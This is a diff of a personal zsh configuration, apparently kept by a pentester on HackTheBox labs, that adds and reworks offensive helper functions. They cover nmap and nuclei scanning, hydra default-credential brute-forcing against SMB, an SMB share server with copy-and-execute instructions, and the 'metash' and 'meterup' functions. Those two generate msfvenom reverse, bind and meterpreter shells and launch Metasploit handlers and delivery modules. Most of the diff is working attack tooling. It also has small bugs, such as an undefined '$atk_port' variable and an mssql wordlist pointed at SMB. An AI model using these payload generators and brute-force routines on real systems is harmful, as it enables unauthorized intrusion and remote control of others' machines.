@@ -3,42 +3,69 @@ alias htb='sudo openvpn /home/damuna/Downloads/lab_Damuna.ovpn'
 alias academy='sudo openvpn /home/damuna/Downloads/academy-regular.ovpn'
 alias tunip="ip -o -4 addr show tun0 | awk '{print \$4}' | cut -d'/' -f1"
 alias gettgtpkinit.py="/home/damuna/TOOLS/PKINITtools/venv/bin/python3 /home/damuna/TOOLS/PKINITtools/gettgtpkinit.py"
+alias pygpoabuse="/home/damuna/TOOLS/pyGPOAbuse/venv/bin/python3 /home/damuna/TOOLS/pyGPOAbuse/pygpoabuse.py"
 # TTY upgrade
-tty()
+tty(){
     echo "script -qc /bin/bash /dev/null \n python3 -c 'import pty; pty.spawn(\"/bin/bash\")' \n CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=xterm \n xterm for teminal type"
-# TCP / UDP Port Scanners
-tcp(){
-    echo -e "\nTCP SCANNING (TOP 99%)\n"
-    sudo nmap -sSCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 3328 -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 $1
+}
 
-    echo -e "\nTCP FULL BACKGROUND SCANNING\n"
-    sudo nmap -sSCV -n -Pn --disable-arp-ping -g 53 -v -p- -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 $1
+# TCP / UDP Port Scanners
+portscan() {
+  dom=$(openssl rand -hex 4)
+  tmux new-session -d -s $dom -n "$1" "source ~/.zshrc; tcp $1; read"
+  tmux split-window -v -t $dom "source ~/.zshrc; udp $1; read"
+  tmux select-layout -t $dom main-vertical
+  tmux resize-pane -t $dom -x 50%
+  tmux attach -t $dom
+}
+
+tcp(){
+    echo -e "\nTCP (TOP-3000) OPEN SCANNING\n"
+    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 3000 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never
+
+    echo -e "\nTCP (TOP-99%) OPEN SCANNING\n"
+    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v --top-ports 8377 --open $1 | grep -iE "^\||[0-9]/tcp" --color=never
+
+    echo -e "\nTCP (FULL) SCANNING\n"
+    sudo nmap -sCV -n -Pn --disable-arp-ping -g 53 -v -p- --reason $1 | grep -iE "^\||[0-9]/tcp" --color=never
+
+    echo -e "\nNUCLEI NETWORK SCAN\n"
+    nuclei -up &>/dev/null && nuclei -ut &>/dev/null
+    nuclei -u $1 -t network/
 }
 
 udp(){
     echo -e "\nUDP SERVICE SCANNING (TOP 100)\n"
-    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v --top-ports 100 -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 --open $1 -oX /tmp/$1_UDP.txt
+    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v --top-ports 100 --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
     udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
     if [[ ! -z $udp_ports ]]; then
-        sudo nmap -sUCV -n -Pn --disable-arp-ping -g 53 -p$udp_ports -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 $1
+        sudo nmap -sUCV -n -Pn --disable-arp-ping -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
     else
         echo "NO UDP PORTS FOUND"
     fi
     sudo rm /tmp/$1_UDP.txt
 
     echo -e "\nUDP SERVICE SCANNING (TOP 99%)\n"
-    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v --top-ports 15094 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 --open $1 -oX /tmp/$1_UDP.txt
+    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v  --top-ports 15094 --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never --color=never
 
     udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
     if [[ ! -z $udp_ports ]]; then
-        sudo nmap -sUCV -n -Pn --disable-arp-ping -g 53 -p$udp_ports -T4 --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 $1
+        sudo nmap -sUCV -n -Pn --disable-arp-ping  -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
     else
         echo "NO UDP PORTS FOUND"
     fi
     sudo rm /tmp/$1_UDP.txt
 
     echo -e "\nUDP FULL BACKGROUND SCANNING\n"
-    sudo nmap -sU -n -Pn --disable-arp-ping -g 53 -v -p- --min-rate=250 --max-rtt-timeout 150ms --max-retries 2 --open $1
+    sudo nmap -sU -n -Pn --disable-arp-ping  -g 53 -v -p- --open $1 -oX /tmp/$1_UDP.txt | grep -iE "^\||[0-9]/udp" --color=never
+
+    udp_ports=$(cat /tmp/$1_UDP.txt | xmlstarlet sel -t -v '//port[state/@state="open"]/@portid' -nl | paste -s -d, -)
+    if [[ ! -z $udp_ports ]]; then
+        sudo nmap -sUCV -n -Pn --disable-arp-ping  -g 53 -p$udp_ports --open $1 | grep -iE "^\||[0-9]/udp" | grep -vE "open\|filtered" --color=never
+    else
+        echo "NO UDP PORTS FOUND"
+    fi
+    sudo rm /tmp/$1_UDP.txt
 }
 
 
@@ -508,7 +535,7 @@ nscan(){
 
         read -r resp\?"DO YOU WANT TO CHECK DEFAULT CREDENTIALS? (Y/N): "
         if [[ $resp =~ [Yy] ]]; then
-            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/smb-betterdefaultpasslist.txt smb://$1:$2
+            hydra -V -t 8 -e nsr -f -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt smb://$1:$2
         fi
 
         echo -e "\nMSF VERSION FINGERPRINT\n"
@@ -879,7 +906,7 @@ smbserv(){
     usr=$(echo $creds | cut -d ":" -f1)
     psw=$(echo $creds | cut -d ":" -f2)
     if [[ ! -z $creds ]]; then
-        echo -e "\nCONNECT WITH: net use n: \\\\\\$ip\\share /user:$usr $psw \n copy n:\\[FILE]\n"
+        echo -e "\nCONNECT WITH: net use n: \\\\\\$ip\\share /user:$usr $psw \nCOPY FILE: copy n:\\[FILE]\nEXECUTE FILE: n:\[FILE]"
         smbserver.py -ip $ip -user $usr -password $psw -smb2support share $(pwd)
     else
         echo -e "\nCONNECT WITH: copy \\\\\\$ip\\share\\[FILE]\n"
@@ -902,12 +929,10 @@ paramfuzz(){
 }
 
 ligcreate(){
-    echo -e "ligcreate [NOME_INTERFACCIA] [ROUTE_INTERFACCIA]"
     usr=$(whoami)
     sudo ip tuntap add user $usr mode tun $1
     sudo ip link set $1 up
     sudo ip route add $2 dev $1
-    sudo ip route add 240.0.0.1/32 dev $1
 }
 
 # Password spraying
@@ -921,14 +946,23 @@ alive(){
     cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
     if [ -f ./$1 ]; then
         echo -e "\nNMAP SWEEPING\n"
-        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 -iL $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt
+        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping -iL $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt
 
     elif [[ $1 =~ $cidr_regex ]]; then
-        echo -e "\nFPING SWEEPING\n"
-        fping -asgq $1
+    	echo -e "\nFPING SWEEPING\n"
+	    fping -asgq $1
 
         echo -e "\nNMAP SWEEPING\n"
-        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt
+        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt
+
+        echo -e "\nNMAP TOP 100 TCP SWEEP\n"
+        sudo nmap -n -Pn -g 53 -F --reason --disable-arp-ping $1
+    else
+        echo -e "\nNMAP PING SCANNING IP\n"
+        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 --reason  --disable-arp-ping $1 | grep for | cut -d" " -f5 > alive_ips.txt && cat alive_ips.txt && rm alive_ips.txt
+
+        echo -e "\nNMAP TOP 100 TCP SWEEP\n"
+        sudo nmap -n -Pn -g 53 -F --reason --disable-arp-ping $1
     fi
 }
 
@@ -1036,7 +1070,9 @@ searchpass(){
 }
 
 # MSF Listener / Binder Generator
+# MSF Listener / Binder Generator
 metash(){
+    chnic
     read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
     if [[ $os =~ ^lin* ]]; then
         read -r form\?"SELECT FORMAT (elf, elf-so): "
@@ -1052,45 +1088,60 @@ metash(){
     fi
 
     read -r type\?"SELECT STAGING: (staged / stageless): "
-    read -r lis\?"SELECT CONNECTION (bind / reverse): "
-    chnic
-    read -r port\?"LISTENER PORT: "
+    if [[ $type == "stageless" ]]; then
+        read -r lis\?"SELECT CONNECTION (bind / reverse): "
+    fi
+
+    if [[ $type == "staged" ]]; then
+        read -r lis\?"SELECT CONNECTION (bind / reverse / meterpreter): "
+    fi
+
+    read -r lhost\?"INPUT PAYLOAD IP/NIC: "
+    read -r port\?"INPUT PAYLOAD PORT: "
 
     if [[ $os =~ ^lin* ]]; then
         if [[ $os == "lin32" ]]; then
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x86/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
-                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x86/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
-                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
+                fi
+
+                if [[ $lis == "meterpreter" ]]; then
+                    echo -e "\nGENERATING SHELL\n"
+                    msfvenom --smallest -p linux/x86/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+
+                    echo -e "\nOPENING HANDLER\n"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
 
             if [[ $type == "stageless" ]]; then 
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x86/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
-                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x86/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
-                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
         fi
@@ -1098,35 +1149,43 @@ metash(){
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
-                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
-                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
+                fi
+
+                if [[ $lis == "meterpreter" ]]; then
+                    echo -e "\nGENERATING SHELL\n"
+                    msfvenom --smallest -p linux/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+
+                    echo -e "\nOPENING HANDLER\n"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
             if [[ $type == "stageless" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
-                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p linux/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
-                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
         fi
@@ -1137,35 +1196,43 @@ metash(){
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p windows/x64/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
-                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p windows/x64/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
-                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
+                fi
+
+                if [[ $lis == "meterpreter" ]]; then
+                    echo -e "\nGENERATING SHELL\n"
+                    msfvenom --smallest -p windows/x64/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+
+                    echo -e "\nOPENING HANDLER\n"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
             if [[ $type == "stageless" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p windows/x64/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
-                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom --smallest -p windows/x64/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
-                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
         fi
@@ -1173,35 +1240,43 @@ metash(){
             if [[ $type == "staged" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom -a x86 -p windows/shell/bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
-                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/x86/shell/bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom -a x86 -p windows/shell/reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom -a x86 -p windows/shell/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
-                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $inter; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
+                fi
+
+                if [[ $lis == "meterpreter" ]]; then
+                    echo -e "\nGENERATING SHELL\n"
+                    msfvenom -a x86 -p windows/meterpreter/reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+
+                    echo -e "\nOPENING HANDLER\n"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
             if [[ $type == "stageless" ]]; then
                 if [[ $lis == "bind" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom -a x86 -p windows/shell_bind_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     read -r target\?"INPUT TARGET IP AFTER SHELL EXECUTION: "
-                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_bind_tcp; set RHOST $target; set LPORT $atk_port; run;"
                 fi
 
                 if [[ $lis == "reverse" ]]; then
                     echo -e "\nGENERATING SHELL\n"
-                    msfvenom -a x86 -p windows/shell_reverse_tcp -f $form LHOST=$nic LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
+                    msfvenom -a x86 -p windows/shell_reverse_tcp -f $form LHOST=$lhost LPORT=$port EXITFUNC=thread -o $lis-$os.$ext_form
 
                     echo -e "\nOPENING HANDLER\n"
-                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST $inter; set LPORT $port; run;"
+                    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST $nic; set LPORT $port; run;"
                 fi
             fi
         fi
@@ -1456,6 +1531,8 @@ pyenv(){
     if [[ -f ./requirements.txt ]]; then
         python3 -m pip install -r requirements.txt
     fi
+    which python3
+    pwd
 }
 
 #Responder Server
@@ -1512,25 +1589,42 @@ pfx2key(){
 # Meterpreter Upgrade Windows Generator
 meterup(){
     chnic
-    read -r mtd\?"SELECT DELIVERY METHOD (smb, http, webdav): "
-    read -r arch\?"SELECT ARCHITECTURE (32, 64): "
+    read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
+    if [[ $os =~ "win" ]]; then
+        read -r mtd\?"SELECT DELIVERY METHOD (smb, http, webdav): "
+    fi
+
     pl=""
-    if [[ $arch == "32" ]]; then
-        pl="/"
-    fi
-    if [[ $arch == "64" ]]; then
-        pl="/x64/"
-    fi
-    if [[ $mtd == "smb" ]]; then
-        sudo msfconsole -q -x "use exploit/windows/smb/smb_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
-    fi
-
-    if [[ $mtd == "http" ]]; then
-        sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows${pl}meterpreter/reverse_tcp; set target 2; set LHOST $nic; set SRVHOST $nic; run"
+    if [[ $os =~ "lin" ]]; then
+        if [[ $os == "lin32" ]]; then
+            pl="/x86/"
+        fi
+        if [[ $os == "lin64" ]]; then
+            pl="/x64/"
+        fi
+        sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload linux${pl}meterpreter/reverse_tcp; set target 7; set LHOST $nic; set SRVHOST $nic; run"
     fi
 
-    if [[ $mtd == "webdav" ]]; then
-        sudo msfconsole -q -x "use exploit/windows/misc/webdav_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
+    if [[ $os =~ "win" ]]; then
+        if [[ $os == "win32" ]]; then
+            pl="/"
+        fi
+
+        if [[ $os == "win64" ]]; then
+            pl="/x64/"
+        fi
+
+        if [[ $mtd == "smb" ]]; then
+            sudo msfconsole -q -x "use exploit/windows/smb/smb_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
+        fi
+
+        if [[ $mtd == "http" ]]; then
+            sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows${pl}meterpreter/reverse_tcp; set target 2; set LHOST $nic; set SRVHOST $nic; run"
+        fi
+
+        if [[ $mtd == "webdav" ]]; then
+            sudo msfconsole -q -x "use exploit/windows/misc/webdav_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
+        fi
     fi
 }
 
@@ -1702,3 +1796,6 @@ smbmount() {
         return 1
     fi
 }
+
+
+
